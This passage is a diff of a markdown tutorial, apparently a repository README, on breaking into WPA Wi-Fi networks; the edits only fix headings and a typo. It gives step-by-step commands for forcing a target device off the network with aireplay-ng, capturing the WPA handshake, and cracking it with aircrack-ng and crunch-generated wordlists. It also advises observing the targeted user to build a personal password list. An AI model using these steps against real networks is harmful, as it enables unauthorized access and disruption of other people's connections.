@@ -59,18 +59,18 @@ $ sudo aireplay-ng --deauth <MSECONDS> -a <BSSID> -c <TARGERDEVICEMACADDRESS> wl
 ```
 >Example: `sudo aireplay-ng --deauth 1000 -a EC:08:6B:C7:24:CA -c 28:3F:69:46:2C:F2 wlan0mon`.
 -Tip: The greater `MSECONDS` is, the longer that device gets hard time connecting to wi-fi.
->After the attack, at the first terminal, you shoul be able to see `WPA handshake: EC:08:6B:C7:24:CA` n top.
+>After the attack, at the first terminal, you shoul be able to see `WPA handshake: EC:08:6B:C7:24:CA` on top.
 
-##Decrypting
+## Decrypting
 >This is the hard part. You have the handshake but, it is still encrypted. However, there are few methods to decrypt.
 >Your `handshake` document will be waiting at `/home/pi`. You will see some new documents, you will only going to need the one named `handshake.cap`.
 
-###Aircrack-ng
+### Aircrack-ng
 >You could try using `aircrack-ng` but, it will take so much time.
 ```
 $ sudo aircrack-ng handshake.cap
 ```
-###Listing All Combinations
+### Listing All Combinations
 ```
 $ sudo crunch <NUMBER> <NUMBER> <CHARACTERS> -a <FILENAME> <SPECIALS>
 ```
@@ -78,7 +78,7 @@ $ sudo crunch <NUMBER> <NUMBER> <CHARACTERS> -a <FILENAME> <SPECIALS>
 >What this line do is, listing all the possible combination password that has min 4, max 6 characters; the characters/numbers of 1 2 3 a and b will be used and that starts with a and ends with b.
 >Since passwords are long and complicated than just normal texts, I would guess this will also take some time.
 
-###Making Your Own rockyou List
+### Making Your Own rockyou List
 >`rockyou.txt` is a list of common password on internet. And this is where things gets interesting. Know your target, observe the user, try to guess possible key words and write them all.
 >After you are done with rockyou list,
 ```
